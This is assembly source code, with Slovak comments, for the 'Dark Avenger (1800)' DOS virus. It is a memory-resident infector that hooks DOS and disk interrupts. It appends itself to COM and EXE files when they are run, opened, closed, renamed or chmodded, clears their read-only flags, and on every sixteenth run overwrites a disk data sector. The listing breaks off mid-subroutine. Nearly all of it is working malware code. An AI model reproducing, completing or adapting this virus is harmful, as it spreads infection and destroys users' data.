; --------------------------------------------------------------------------
;   Virus Dark Avenger (1800)   Sourced by Roman_S   
; --------------------------------------------------------------------------
;
; Rezidentny virus o dlzke 1800 byte. Napada subory COM a EXE s minimalnou
; dlzkou 1775 byte. Subor je napadnuty pri Rename, Close, Chmod, Exec
; Prekonava nastaveny Read Only flag. Predefinovava Critical Error (???)
; Kazde 16 spustenie nakazeneho programu sposobi znicenie jedneho sektora
; disku z data oblasti (zapise sam seba). Pocet spusteni a posledne prepisany
; sektor si uklada do BOOTu na posledne 3 znaky systemoveho mena.
; Uhniezduje sa na vrchole ram (Asi 3800 byte). Kazde predefinovanie INT 21h
; vrati opat na seba (Neporusi retaz). Obabrava Get/Setvector
; Scan ho hlasi ako aktivneho uz pri kopirovani nakazeneho suboru co je blbost.

interrupt_13    equ     4Ch ;Adresa disk i/o interruptu 13h *4 (0000:4C)
interrupt_21    equ     84h ;Adresa DOS interruptu 21h
interrupt_24    equ     90h ;Adresa Critical Error interruptu 24h
interrupt_27    equ     9Ch ;Adresa TSR interruptu 27h
interrupt_40    equ     100h    ;Adresa Disk Reqest int 40h
interrupt_41H   equ     106h    ;Segmentova adresa int riadenia 8259

PSP_top_ram     equ     2   ;Offset v PSP-top of avail.sys.memory (parag)
PSP_avail       equ     6   ;Available byte in PSP (only for COM file)
PSP_reserved    equ     2Ah ;Offset v PSP - DOS reserved

MCB_typ     equ     0   ;Typ bloku:'M'-stredny blok 'N'-posledny blok
MCB_owner       equ     1   ;MCB - vlastnik bloku (for freemem)
data_5e     equ 0
data_6e         equ     2
MZ      equ 5a4dh   ;Znacka 'MZ' identifikujuca EXE program12

start_prog  equ     06FDh   ;Tu je ulozena startovacia adr.povodneho pr.
stack_prog  equ     0701h   ;Tu je nastavenie zasobnika EXE prog. SS:SP
old_3_byte      equ     0705h   ;Povodne 3 byte z COM programu (JMP virus)
handle          equ     0708h   ;Handle vyhliadnuteho suboru
file_name   equ 070Ah   ;Meno vyhliadnuteho suboru
old_27          equ     074Bh   ;      TSR int
old_21          equ     074Fh   ;      DOS int
buffer_file     equ     0753h   ;Tu nacitava cast suboru ktory ide nakazit
file_lenght     equ     076Bh   ;Dlzka suboru ktory sa ide nakazit

                     ;Offety v EXE file header
EXE_PartPage   equ  buffer_file+2    ;Lenght of partial page at end
EXE_PageCnt    equ  buffer_file+4    ;Lenght of image in 512 byte pages, vcetne header
EXE_Hdr_Size   equ  buffer_file+8    ;Size of Header in paragraph
EXE_Relo_SS    equ  buffer_file+0Eh  ;Segment offset of stack segment (for set SS)
EXE_startSP    equ  buffer_file+10h  ;Value for SP register (Stack pointer) start
EXE_IP_start   equ  buffer_file+14h  ;Value for IP register when started
EXE_Relo_CS    equ  buffer_file+16h  ;Segment offset of code segment (for setting CS)
EXE_Tabl_Off   equ  buffer_file+18h  ;File-offset of first relocation item
EXE_Overlay    equ  buffer_file+1Ah  ;Overlay number (0-base module)

                ;Offsety v BOOT sektore
BOOT_name   equ 3   ;System name
Sect_Size   equ 0Bh ;Velkost sektora v byte
Reserv_Sect equ 0Eh ;Pocet sektorov pred FAT (reserved sector)
FAT_number  equ 10h ;Pocet FAT tabuliek
ROOT_size   equ 11h ;Pocet 32 byt poloziek v ROOT
Total_Sect  equ 13h ;Celkovy pocet sektorov
FAT_size    equ 16h ;Velkost FATu v sektoroch

virus_dav   segment byte public
        assume  cs:virus_dav, ds:virus_dav

        org 100h
dav     proc    far
; --------------                ;Original program
start:      jmp run_virus
old_prog:   nop
        mov ah,9
        mov dx,offset text_old_prog
        int 21h         ;Display char string at ds:dx
        mov ax,4C00h
        int 21h         ;Terminate with al=return code
                        ;Tu su 0 pre dlzku programu
        org 07e9h
text_old_prog   db  'Hello$'
; --------------            ;Koniec Original programu - zac. virusu

run_vir     db  'Eddie lives...somewhere in time!', 0
        db  0, 90h, 23h, 12h, 1Eh

dokoncenie_EXE: mov bx,es
        add bx,10h
        add bx,cs:[start_prog+si+2]      ;Vyber start adress SEG
;       db  2eh,89h,9ch,53h,0    ;Original virus byte next instr.
        mov cs:[si+(jump-run_vir+3)],bx  ;Uloz na jump+3
        mov bx,cs:[start_prog+si]        ;        adress OFF
;       db  2eh,89h,9ch,51h,0    ;Original virus byte next instr.
        mov cs:[si+(jump-run_vir+1)],bx  ;            jump OFF
        mov bx,es
        add bx,10h
        add bx,cs:[stack_prog+si+2]
        mov ss,bx
        mov sp,cs:[stack_prog+si]
jump:       db  0EAh, 0, 0, 0, 0    ;jmp far original programm

dokoncenie_COM:
        mov di,100h         ;Zaciatok COM programu
        add si,original_bytes-run_vir
        movsb               ;Restore 3 byte origin.prog.
        movsw
        mov sp,ds:[PSP_avail]
        xor bx,bx
        push    bx          ;Push 0
        jmp word ptr [si-0Bh]   ;*

run_virus:  call    run_virus_      ;Push offset run_virus
dav     endp

run_virus_  proc    near
        pop si
;       db  81h,0eeh,6bh,0h     ;Original virus byte next 2 instr.
        sub si,run_virus-run_vir+3     ;SI = offset run_vir
        nop                ;Cez SI indexuje data
        cld                ;Clear direction
        cmp cs:[old_3_byte+si],MZ   ;EXE program ?
        je  pokracuj
        cli             ;Disable interrupts
        mov sp,si
        add sp,808h         ;SP = 0FF7h  (105h za koniec prog)
        sti             ;Enable interrupts
        cmp sp,ds:[PSP_avail]
        jae dokoncenie_COM      ;End ak je vrchol moc vysoko

pokracuj:   push    ax          ;Backup original AX
        push    es          ;Backup original ES
        push    si          ;Backup run_vir offset
        push    ds          ;Backup original DS
        mov di,si           ;DI=SI - run_vir
        xor ax,ax               ;Zero register
        push    ax              ;Push 0
        mov ds,ax               ;DS = 0
        les ax,dword ptr ds:interrupt_13    ;ES:AX = int 13h
        mov cs:[old_13-run_vir+si],ax           ;Uloz si old int 13h
        mov cs:[old_13-run_vir+si+2],es
        mov cs:[old_40-run_vir+si],ax
        mov cs:[old_40-run_vir+si+2],es

        mov ax,ds:[interrupt_40+2]  ;AX = SEG adresa int 40h
        cmp ax,0F000h       ;Ukazuje do ROM ?
        jne no_ROM
        mov cs:[old_40-run_vir+si+2],ax ;Nie -> je predefinovany
        mov ax,ds:[interrupt_40]
        mov cs:[old_40-run_vir+si],ax
        mov dl,80h
        mov ax,ds:interrupt_41H
        cmp ax,0F000h
        je  int41_isROM
        cmp ah,0C8h
        jb  no_ROM
        cmp ah,0F4h
        jae no_ROM
        test    al,7Fh
        jnz no_ROM
        mov ds,ax
        cmp word ptr ds:0,0AA55h
        jne no_ROM
        mov dl,ds:2

int41_isROM:    mov ds,ax
        xor dh,dh
        mov cl,9
        shl dx,cl
        mov cx,dx
        xor si,si

locloop_1:  lodsw
        cmp ax,0FA80h
        jne loc_2
        lodsw
        cmp ax,7380h
        je  loc_3
        jnz loc_4

loc_2:      cmp ax,0C2F6h
        jne loc_5
        lodsw
        cmp ax,7580h
        jne loc_4

loc_3:      inc si
        lodsw
        cmp ax,40CDh
        je  loc_6
        sub si,3

loc_4:      dec si
        dec si
loc_5:      dec si
        loop    locloop_1

        jmp short no_ROM
loc_6:      sub si,7
        mov cs:[old_13-run_vir+di],si
        mov cs:[old_13-run_vir+di+2],ds

no_ROM:     mov si,di               ;SI = run_vir
        pop ds              ;Pop 0
        les ax,dword ptr ds:interrupt_21    ;ES:AX - int 21h
        mov cs:[old_21+si],ax       ;Odloz si int 21h
        mov cs:[old_21+si+2],es
        push    cs
        pop ds          ;DS = CS
        cmp ax,new_21-run_vir   ;Je off int 21h moj offset ?
        jne vir_no_in_mem

; Offset int 21h sedi aj pre mna, teraz fyzicky skontrolujem ci som to ja

        xor di,di           ;DI - 0 (Zaciatok seg int 21h)
        mov cx,6EFh         ;CX - lenght virus
next_byte1:                 ;SI - off run_vir
        lodsb
        scasb               ;DS:SI = ES:DI ?
        jnz vir_no_in_mem       ;Ak nie neni to virus
        loop    next_byte1      ;Skontroluj celu dlzku vira
        pop es
        jmp no_enouch_mem

; Virus neni v RAM ideme sa pokusit o jeho uhniezdenie. Uvolnim vsetku RAM
; zabranu EXECom a odoberiem asi 4 Kb ktore si samostatne zaberiem
; Predefinujem INT 21h,27h

vir_no_in_mem:  pop es          ;ES = DS original programm
        mov ah,49h          ;Uvolnenie RAM (Alokoval EXEC)
        int 21h         ;Release memory block, es=seg

        mov bx,0FFFFh       ;Dlzka aka neexistuje ->
        mov ah,48h          ;   -> zistenie free ram
        int 21h         ;Allocate memory, bx=bytes/16
                        ;BX - free mem
        sub bx,0E7h         ;Odpocitaj moju dlzku
        jc  no_enouch_mem       ;Skok ak neni dost pamati
        mov cx,es
        stc             ;Set carry flag
        adc cx,bx           ;CX-seg adr konca mnou aloc ram
        mov ah,4Ah
        int 21h         ;Alokuj o 4 Kb ram menej ako bolo

        mov bx,0E6h
        stc             ;Set carry flag
        sbb es:PSP_top_ram,bx   ;Oprav top ram v PSP o moju dlzku
        push    es          ;Backup original DS
        mov es,cx
        mov ah,4Ah
        int 21h         ;Alokuj tych 4 Kb (ES ???)

        mov ax,es           ;AX=ES - seg adr 4 Kb bloku
        dec ax
        mov ds,ax           ;DS - pred tento blok -> MCB
        mov word ptr ds:MCB_owner,8 ;Nastav vlastnika na 8 ???
        call    Paragr2_addr        ;DX:AX = 16 * AX
        mov bx,ax
        mov cx,dx           ;CX:BX - ukazatel na blok 4Kb
        pop ds          ;Restore original DS
        mov ax,ds
        call    Paragr2_addr        ;DX:AX - adresa vyrobena z DS
        add ax,ds:PSP_avail         ;???
        adc dx,0            ;Pre CARRY
        sub ax,bx
        sbb dx,cx           ;Odpocitaj ??? (vyslo zaporne)
        jc  zapor
        sub ds:PSP_avail,ax

zapor:      pop si          ;SI = run_vir
        push    si
        push    ds          ;Backup original DS
        push    cs          ;PUSH
        xor di,di
        mov ds,di           ;DS = 0
        lds ax,dword ptr ds:interrupt_27    ;DS:AX - int 27h (TSR)
        mov cs:[old_27+si],ax       ;Backup old int 27h
        mov cs:[old_27+si+2],ds
        pop ds          ;POP  (DS=CS) (ES=seg blok 4Kb)
        mov cx,753h         ;Virus lenght
        rep movsb           ;Copy virus DI=0 SI=run_vir

        xor ax,ax           ;DS = 0
        mov ds,ax
        mov word ptr ds:interrupt_21,new_21-run_vir ;offs new_21 voci zaciatku vira
        mov word ptr ds:interrupt_21+2,es       ;Seg 4 Kb ram
        mov word ptr ds:interrupt_27,new_27-run_vir ;offs new_27
        mov word ptr ds:interrupt_27+2,es
        mov es:handle,ax                ;Inicializacia
        pop es          ;ES = original DS

; Tato cast sa vykonava vzdy (bez ohladu na to ci je virus v pamati)
; Kazde 16 zavolanie sposobuje zapis 1 sektora na disk - kill
; Pocet volani a cislo posledneho zniceneho sektora si znaci do BOOT (name)
no_enouch_mem:
vir_in_memory:  pop si          ;SI - run_vir
        xor ax,ax
        mov ds,ax           ;DS = 0
        mov ax,ds:interrupt_13      ;Int 13h odloz
        mov cs:[doc_old_13-run_vir+si],ax
        mov ax,word ptr ds:interrupt_13+2
        mov cs:[doc_old_13-run_vir+si+2],ax
                            ;Nastav novy int 13h
        mov word ptr ds:interrupt_13, new_13-run_vir
        add ds:interrupt_13,si          ;???
        mov word ptr ds:interrupt_13+2,cs
        pop ds          ;DS = original ES
        push    ds
        push    si          ;AX,ES, SI = run vir
        mov bx,si           ;Backup SI on BX
        lds ax,dword ptr ds:PSP_reserved    ; DS:AX = enviromnent
        xor si,si
        mov dx,si           ;DX=SI=0

; DS:0000 ukazuje na environment pred programom (Pred PSP) kde je PATH,
; kompletna cesta na tento program. Zaujima nas drive aby mohol pisat na BOOT
; ideme vyhladat znak drive (PATH,0,0,DRIVE+PATH+NAME).

find_next_byte: lodsw
        dec si
        test    ax,ax           ;Koniec PATH ?
        jnz find_next_byte
        add si,3            ;Posun sa na znak drive
        lodsb               ;AL = znak drive

        sub al,'A'          ;AL=cislo drive (0=A,1=B...)
        mov cx,1            ;CX = 1 sector, DX = 0 Boot
        push    cs
        pop ds          ;DS = my segment
        add bx,buf_BOOT-run_vir ;BX = offset buffer for BOOT
        push    ax
        push    bx          ;Backup AX,BX,CX
        push    cx
        int 25h         ;Absolute read - BOOT sector
        pop ax          ;Pop word from int 25h
        pop cx          ;Restore CX,BX
        pop bx
        inc byte ptr [bx+BOOT_name+7] ;Last char name in BOOT sector
        and byte ptr [bx+BOOT_name+7],0Fh ;16te volanie ?
        jnz no_kill1

; Kazde 16te volanie nakazeneho programu sposobuje znicenie 1 sektora

        mov al,[bx+FAT_number]  ;AX = Pocet FAT tabuliek
        xor ah,ah
        mul word ptr [bx+FAT_size]  ;AX = Pocet FAT * Velkost FAT (sect.)
        add ax,[bx+Reserv_Sect] ;   + Sector before forst FAT
        push    ax          ;Backup AX (ROOT sect. start)
        mov ax,[bx+ROOT_size]   ;Max ROOT poloziek (32byte kazda)
        mov dx,20h          ;Velkost polozky v ROOT
        mul dx          ;DX:AX = 20h*AX (root size int bytes)
        div word ptr [bx+Sect_Size] ;AX = number sectors of ROOT
        pop dx          ;Restore AX
        add dx,ax           ;DX = start disk data
        mov ax,[bx+BOOT_name+5] ;Cislo posledne zniceneho sect.
        add ax,40h          ;Pokroc o kusok dalej
        cmp ax,[bx+Total_Sect]  ;Neni si uz mimo rozsah ?
        jb  sect_ok         ;Jump if AX < Total Sectors
        inc ax
        and ax,3Fh          ;A znova s posunom
        add ax,dx           ;Pridaj start disk data
        cmp ax,[bx+Total_Sect]  ;Neni to nahodou aj tak zle ?
        jae error_end_disk      ;Jump if AX >= Total Sectors
sect_ok:    mov [bx+BOOT_name+5],ax ;Uchovaj posl. zniceny sect.

; Zapisanie upraveneho BOOT sektora (zmenene pocitadlo volani),
; pripadne (ak = 0) zmenene cislo posledne zniceneho sektora.
                        ;BX = offset buffer for BOOT
no_kill1:   pop ax          ;Restore aj AX
        xor dx,dx           ;DX=0 - sector 0 (BOOT)
        push    ax          ;Backup registers
        push    bx
        push    cx
        int 26h         ;Absolute disk write BOOT
        pop ax          ;Pop word (Nechava INT 26h)
        pop cx          ;Restore registers
        pop bx
        pop ax
        cmp byte ptr [bx+BOOT_name+7],0 ;Bolo to 16te volanie ?
        jne no_kill2            ;Ak nie odchod
                        ;Prepisanie vypocitaneho sect.
        mov dx,[bx+BOOT_name+5] ;Vyber si cislo sektora (kill)
        pop bx          ;BX = run_vir
        push    bx
        int 26h         ;Kill random sector (write vir)
error_end_disk: pop ax          ;Vyber word po int 26h

no_kill2:   pop si          ;SI = run_vir
        xor ax,ax           ;DS = 0
        mov ds,ax
        mov ax,cs:[doc_old_13-run_vir+si] ;Restore int 13h
        mov ds:interrupt_13,ax
        mov ax,cs:[doc_old_13-run_vir+si+2]
        mov word ptr ds:interrupt_13+2,ax
        pop ds          ;Restore original ES,AX
        pop ax
        cmp cs:[old_3_byte+si],MZ   ;EXE file ?
        jne COM_programm
        jmp dokoncenie_EXE
COM_programm:   jmp dokoncenie_COM
run_virus_  endp

; ------------------------------------------------------------------
;   Predefinovany Critical Error pocas infikovania suboru
; ------------------------------------------------------------------
new_crit_err:   mov al,3            ;Fail return number
        iret                ;Interrupt return

; -------------------------------------------------------------------
;           Predefinovany TSR vector.
;  Tato cast sluzi aj na nacitanie BOOT sectora. Najskor je ale
;  prekopirovana spolu s celym virom do  zaalokovaneho bloku (asi 4 kb)
; -------------------------------------------------------------------
new_27:
buf_BOOT:   pushf               ;Backup flag
        call    set_PSP_0
        popf                ;Restore flag
        jmp dword ptr cs:[old_27]   ;Original interrupt TSR

; ---------------------------------------------------------------------
;       DOS sluzby setvect a getvect (21h,27h)
; ---------------------------------------------------------------------
setv_27:    mov cs:[old_27],dx      ;Uchovaj si pre seba novu hodn.
        mov cs:[old_27+2],ds
        popf                ;Pop flags
        iret                ;Interrupt return

setv_21:    mov cs:[old_21],dx
        mov cs:[old_21+2],ds
        popf
        iret

getv_27:    les bx,dword ptr cs:[old_27] ;Vrat mu poslednu hodnotu
        popf
        iret


getv_21:    les bx,dword ptr cs:[old_21]
        popf
        iret

; ----------------------------------------------------------------------
;   Sluzba DOS 4bh Executable or Load a Program (DS:DX - filespec)
; ----------------------------------------------------------------------
exec:       call    infect_file     ;Pokus sa ho nakazit
        call    set_PSP_0
        popf
        jmp dword ptr cs:[old_21]   ;Riadne spustenie programu

        db  'Diana P.',0

; ----------------------------------------------------------------------
;   Novy interrupt DOS. Na pracu so suborom sa ho pokusa nakazit.
; ----------------------------------------------------------------------
new_21:     push    bp          ;Backup BP
        mov bp,sp
        push    word ptr [bp+6]
        popf
        pop bp          ;Restore BP

        pushf
        call    test_redef_21       ;Zisti ci niekto nepredefinoval
        cmp ax,2521h
        je  setv_21         ;Setvect 21h
        cmp ax,2527h
        je  setv_27         ;Setvect 27h
        cmp ax,3521h
        je  getv_21         ;Getvect 21h
        cmp ax,3527h
        je  getv_27         ;Getvect 27h
        cld             ;???
        cmp ax,4B00h
        je  exec            ;Exec program
        cmp ah,3Ch
        je  create_file     ;Create file
        cmp ah,3Eh
        je  close_file      ;Close file
        cmp ah,5Bh          ;New file ?
        jne cont1_21

; -----------------------------------------------------------------------
;           Create, new, close file
;  Ak premenna handle je 0 a subor je EXE or COM poznaci si jeho handle
; -----------------------------------------------------------------------
create_file:
new_file:   cmp word ptr cs:[handle],0  ;Mam uz nieco vyhliadnute ?
        jne vykon_&_end_21      ;Ak ano (handle!=0) nezaujem
        call    test_extension      ;Kontrola EXE, COM (Z=1 if yes)
        jnz vykon_&_end_21      ;Nema zmysel neni vykonatelny
        call    set_PSP_0
        popf
        call    call_old_21     ;Riadne vykonanie DOS funkcie
        jc  return_INT21        ;Vyskoc ak vratil DOS error

        pushf               ;Push flag CF=0
        push    es          ;5 x push registers
        push    cs
        pop es          ;ES=CS
        push    si
        push    di
        push    cx
        push    ax

        mov di,handle       ;Uloz si handle tohto suboru
        stosw               ;DI = file_name
        mov si,dx           ;DS:SI - address filespec
        mov cx,65           ;maximalne 65 znakov
store_filename: lodsb               ;Kopia filename za handle
        stosb
        test    al,al
        jz  name_ok         ;Skok ak koniec retazca
        loop    store_filename      ;Dalsi znak
        mov es:handle,cx        ;CX = 0 error lenght string

name_ok:    pop ax          ;5 x pop registers
        pop cx
        pop di
        pop si
        pop es
close_infect:   popf                ;Popflag CF=0
        jnc return_INT21        ;Jump return interrupt 21h

; ------------------------------------------------------------------------
;               Close file
; Ak handle zatvaraneho suboru = nasemu poznacenemu pokusi sa ho infikovat
; ------------------------------------------------------------------------
close_file: cmp bx,cs:handle        ;Je to vyhliadnuty subor
        jne vykon_&_end_21      ;Ak nie riadne dokonci INT
        test    bx,bx
        jz  vykon_&_end_21      ;dokonci int ak handle=0
        call    set_PSP_0
        popf
        call    call_old_21     ;Zavolaj DOS (close file)
        jc  return_INT21        ;Ak error odchod

        pushf
        push    ds          ;Backup DS,DX
        push    cs
        pop ds          ;DS = CS
        push    dx
        mov dx,file_name        ;DS:DX adress file name
        call    infect_file     ;Pokus sa ho nakazit
        mov word ptr cs:handle,0    ;Handle=0 -> volny pre dalsi subor
        pop dx
        pop ds          ;Restore DS,DX
        jmp short close_infect  ;Skonci interrupt 21h

; ----------------------------------------------------------------------
;           Pokracovanie INT 21h
; ----------------------------------------------------------------------
cont1_21:   cmp ah,3Dh
        je  open_file       ;Open file
        cmp ah,43h
        je  chmod           ;Chmod file
        cmp ah,56h                  ;Rename file ?
        jne vykon_&_end_21      ;Nezaujem - vykonaj co chce a skonci

; ---------------------------------------------------------------------
;            Open, Chmod, Rename file
;
; ---------------------------------------------------------------------
open_file:
chmod:      call    test_extension      ;DS:DX - filename = EXE,COM ?
        jnz vykon_&_end_21      ;Nezaujem
        call    infect_file     ;Pokus sa ho nakazit

; --------------                ;Vykonanie int 21h a koniec
vykon_&_end_21: call    set_PSP_0
        popf
        call    call_old_21     ;Volaj DOS
return_INT21:   pushf
        push    ds          ;Backup DS
        call    set_DSonPSPact      ;Vrat povodne PSP
        mov byte ptr ds:MCB_typ,'Z' ;Tento (MCB) blok je posledny
        pop ds          ;Restore DS
        popf
        retf    2           ;Return far from interrupt

;------------------------------------------------------------------------
; Testovanie extenzie suboru. Vstupuje DS:DX - adress path+filename
;     Vyhladam si '.' a kontrolujem EXE, COM. Ak je vraciam ZF=1
;------------------------------------------------------------------------
test_extension  proc    near
        push    ax          ;Backup AX,SI
        push    si
        mov si,dx           ;DS:SI - start string

dalsi:      lodsb
        test    al,al           ; = 0 ?
        jz  no_COM_EXE      ;Bodka tu ani nie je
        cmp al,'.'
        jne dalsi           ;Hladaj dalej ak neni '.'
        call    char_C_X_?      ;Test AL = <'C','X'> ?
        mov ah,al
        call    char_C_X_?      ;Test next char
        cmp ax,636Fh        ;'co' ?
        je  ext_CO
        cmp ax,6578h        ;'ex' ?
        jne ret_test        ;Neni ani EXE ani COM odchod
        call    char_C_X_?      ;Test tretieho znaku na 'e'
        cmp al,'e'          ;If EXE then ZF=1  (AL='e')
        jmp short ret_test

ext_CO:     call    char_C_X_?      ;Test tretieho znaku na 'm'
        cmp al,'m'          ;ZF=1 if COM
        jmp short ret_test
no_COM_EXE: inc al          ;ZF=0 -> ani EXE ani COM
ret_test:   pop si          ;Restore SI,AX
        pop ax
        retn
test_extension  endp

; -------------------------------------------------------------------
;   Kontroluje ci znak DS:SI++ je z intervalu 'C'-'X'
;       Ak ano return inak pripocita 20h
; -------------------------------------------------------------------
char_C_X_?  proc    near
        lodsb               ;AL = DS:SI++
        cmp al,'C'
        jb  no_C_X          ;Jump if char < 'C'
        cmp al,'X'+1
        jae no_C_X          ;Jump if char > 'X'
        add al,20h
no_C_X:     retn
char_C_X_?  endp


;---------------------------------------------------------------------
;           Volanie riadneho INT 21h
;---------------------------------------------------------------------
call_old_21 proc    near
        pushf               ;Simulate interrupt
        call    dword ptr cs:[old_21]   ;DOS interrupt
        retn
call_old_21 endp


;----------------------------------------------------------------------
;   Pokus o nakazenie suboru ktoreho meno vstupuje cez DS:DX
; Predefinuje Critical error, Disk I/O, pripadne zmeni atributy suboru
;----------------------------------------------------------------------
infect_file proc    near
        push    ds  ;8 x push reg.
        push    es
        push    si
        push    di
        push    ax
        push    bx
        push    cx
        push    dx
        mov si,ds           ;Backup DS to SI
        xor ax,ax           ;DS = 0
        mov ds,ax
        les ax,dword ptr ds:interrupt_24
        push    es          ;Push Critical Error interrupt
        push    ax
        mov word ptr ds:interrupt_24,new_crit_err-run_vir
                            ;Setv 24h,new_crit_err
        mov word ptr ds:interrupt_24+2,cs
        les ax,dword ptr ds:interrupt_13
        mov cs:[doc_old_13-run_vir],ax      ;Backup int 13h
        mov cs:[doc_old_13-run_vir+2],es
                            ;Setv 13h,new_13
        mov word ptr ds:interrupt_13,new_13-run_vir
        mov word ptr ds:interrupt_13+2,cs
        push    es              ;Push int 13h
        push    ax
        mov ds,si           ;Restore DS from SI
        xor cx,cx           ;CX = 0
        mov ax,4300h        ;Read file attribute
        call    call_old_21
        mov bx,cx           ;Backup file attr to BX
        and cl,0FEh         ;Znuluj pripadny Read Only bit
        cmp cl,bl           ;Bolo to vobec treba ?
        je  no_ReadOnly     ;Ak nie preskoc
        mov ax,4301h
        call    call_old_21     ;Set file attribute 0
        stc             ;Set CF=1 - flag zmeny attr.
no_ReadOnly:    pushf
        push    ds          ;Backup DS,DX,BX
        push    dx
        push    bx
        mov ax,3D02h
        call    call_old_21     ;Open file Read/Write (DS:DX)
        jc  open_error      ;Jump if error
        mov bx,ax           ;BX = file handle
        call    append_virus        ;Pokus o pridanie virusu
        mov ah,3Eh
        call    call_old_21     ;Close file (BX=handle)
open_error: pop cx          ;Restore CX (file attrib)
        pop dx
        pop ds          ;DS:DX - filename
        popf
        jnc no_change_attr      ;CF=1 ak bola zmena attrib.
        mov ax,4301h        ;Set old file attribute
        call    call_old_21
no_change_attr: xor ax,ax           ;DS = 0
        mov ds,ax
        pop word ptr ds:interrupt_13    ;Restore int 13h
        pop word ptr ds:interrupt_13+2
        pop word ptr ds:interrupt_24    ;Restore Crit.error
        pop word ptr ds:interrupt_24+2
        pop dx          ;8 x pop reg.
        pop cx
        pop bx
        pop ax
        pop di
        pop si
        pop es
        pop ds
        retn
infect_file endp

;-----------------------------------------------------------------------
;           Pripojenie virusu k suboru.
; Skontroluje dlzku, uchova file Time & Date, nastavi start prog.na seba
;-----------------------------------------------------------------------
append_virus    proc    near
        push    cs
        pop ds
        push    cs
        pop es          ;ES = DS = CS
        mov dx,buffer_file      ;DS:DX - buffer file
        mov cx,18h          ;CX = 18h -> pocet byte
        mov ah,3Fh
        int 21h         ;Read file
        xor cx,cx
        xor dx,dx           ;DX:CX = 0 offset
        mov ax,4202h        ;Seek to end of file
        int 21h         ;DX:AX - new position
        mov word ptr ds:[file_lenght+2],dx  ;Store HI word lenght
        cmp ax,1775         ;Kontrola dlzky (Min 1775)
        sbb dx,0
        jc  file_is_short       ;Subor je moc kratky - odchod
        mov word ptr ds:[file_lenght],ax    ;Store LO word lenght
        cmp word ptr ds:[buffer_file],MZ    ;EXE file ?
        jne com_file1
        mov ax,word ptr ds:[EXE_Hdr_Size]
        add ax,word ptr ds:[EXE_Relo_CS]
        call    Paragr2_addr
        add ax,word ptr ds:[EXE_IP_start]
        adc dx,0
        mov cx,dx
        mov dx,ax
        jmp short append_cont1

com_file1:  cmp byte ptr ds:[buffer_file],0E9h  ;Prvy byte je JMP ?
        jne work_infect     ;Ak nie urcite tam neni vir
        mov dx,word ptr ds:[buffer_file+1]
        add dx,103h
        jc  work_infect
        dec dh
        xor cx,cx           ;CX = 0

append_cont1:   sub dx,run_virus-run_vir    ;Offset vo viruse na 1vu instr.
        sbb cx,0            ;Prenos do HI
        mov ax,4200h        ;Seek to begin file + CX:DX
        int 21h         ;Return DX:AX - new position
        add ax,708h
        adc dx,0
        cmp ax,word ptr ds:[file_lenght]
        jne work_infect
        cmp dx,word ptr ds:[file_lenght+2]
        jne work_infect
        mov dx,76Fh         ;DS:DX address ??????????
        mov si,dx
        mov cx,6EFh         ;Pocet byte
        mov ah,3Fh          ;Read file
        int 21h
        jc  work_infect
        cmp cx,ax           ;Nacital kolko mal ?
        jne work_infect
        xor di,di           ;DI = 0   SI = address ??????????
                        ;Compare file & virus
next_compare:   lodsb
        scasb
        jnz work_infect     ;Jump infect if different
        loop    next_compare        ;Celu dlzku
file_is_short:
return_append:  retn

work_infect:    xor cx,cx           ;DX:CX = 0 (offset)
        xor dx,dx
        mov ax,4202h        ;Seek to end of file
        int 21h
        cmp word ptr ds:[buffer_file],MZ    ;EXE file ?
        je  exe_file1
        add ax,953h         ;COM file
        adc dx,0
        jz  append_cont2
        retn

exe_file1:  mov dx,word ptr ds:[file_lenght]
        neg dl
        and dx,0Fh          ;Najnizsie 4 bity
        xor cx,cx           ;CX = 0
        mov ax,4201h        ;Seek to current position
        int 21h         ;Move file ptr, cx,dx=offset
        mov word ptr ds:[file_lenght],ax
        mov word ptr ds:[file_lenght+2],dx

append_cont2:   mov ax,5700h        ;Read file time & date
        int 21h
        pushf               ;Backup Flag,CX,DS (Tim&Date)
        push    cx
        push    dx
        cmp word ptr ds:[buffer_file],MZ    ;EXE file ?
        je  exe_file2
        mov ax,100h         ;Start COM file
        jmp short append_cont3

exe_file2:  mov ax,word ptr ds:[EXE_IP_start]
        mov dx,word ptr ds:[EXE_Relo_CS]

append_cont3:   mov di,start_prog
        stosw               ;Uloz startovaciu adresu OFF
        mov ax,dx
        stosw               ;            SEG
        mov ax,word ptr ds:[EXE_startSP]
        stosw
        mov ax,word ptr ds:[EXE_relo_SS]
        stosw
        mov si,buffer_file      ;Precitaj a uloz prve 3 byte prog.
        movsb
        movsw
        xor dx,dx           ;DX = 0
        mov cx,708h
        mov ah,40h
        int 21h         ;Append virus to file
        jc  write_error     ;Jump if error
        xor cx,ax           ;Zapisal vsetko ?
        jnz write_error     ;Jump if no
        mov dx,cx
        mov ax,4200h        ;DX:CX = 0 offset
        int 21h         ;Seek to begin file
        cmp word ptr ds:[buffer_file],MZ    ;EXE file ?
        je  exe_file3
        mov byte ptr ds:[buffer_file],0E9h  ;1 byte progr. JMP
        mov ax,word ptr ds:[file_lenght]
        add ax,run_virus-run_vir-3      ; JMP xxx
        mov word ptr ds:[buffer_file+1],ax  ;Uloz hodnotu skoku
        mov cx,3                ;3 byte
        jmp short append_cont4

write_error:    jmp short write_error_

exe_file3:  call    Header_EXE_Size     ;DX:AX = Velkost EXE headera
        not ax
        not dx
        inc ax          ;DX:AX += 1
        jnz no_prenos
        inc dx
no_prenos:  add ax,ds:EXE_Tabl_Off
        adc dx,word ptr ds:EXE_Overlay
        mov cx,10h
        div cx          ;ax,dx rem=dx:ax/reg
        mov word ptr ds:EXE_IP_start,run_virus-run_vir
        mov ds:EXE_Relo_CS,ax
        add ax,71h
        mov ds:EXE_Relo_SS,ax
        mov word ptr ds:EXE_startSP,100h
        add word ptr ds:EXE_Tabl_Off,708h
        adc word ptr ds:EXE_Overlay,0
        mov ax,ds:EXE_Tabl_Off
        and ax,1FFh
        mov ds:EXE_PartPage,ax
        pushf
        mov ax,word ptr ds:EXE_Tabl_Off+1
        shr byte ptr ds:EXE_Overlay+1,1 ;Shift w/zeros fill
        rcr ax,1                ;Rotate thru carry
        popf
        jz  loc_9
        inc ax
loc_9:      mov ds:EXE_PageCnt,ax
        mov cx,18h

append_cont4:   mov dx,buffer_file      ;CX = 3 byte JMP virus
        mov ah,40h
        int 21h         ;Write to begin file (JMP vir)
write_error_:   pop dx
        pop cx
        popf
        jc  nemen_T&D
        mov ax,5701h        ;Set old file Time & Date
        int 21h
nemen_T&D:  retn
append_virus    endp


;---------------------------------------------------------------------
;                  SUBROUTINE
;---------------------------------------------------------------------
set_PSP_0   proc    near
        push    ds          ;Backup DS
        call    set_DSonPSPact
        mov byte ptr ds:MCB_typ,'M'
        pop ds          ;Restore DS


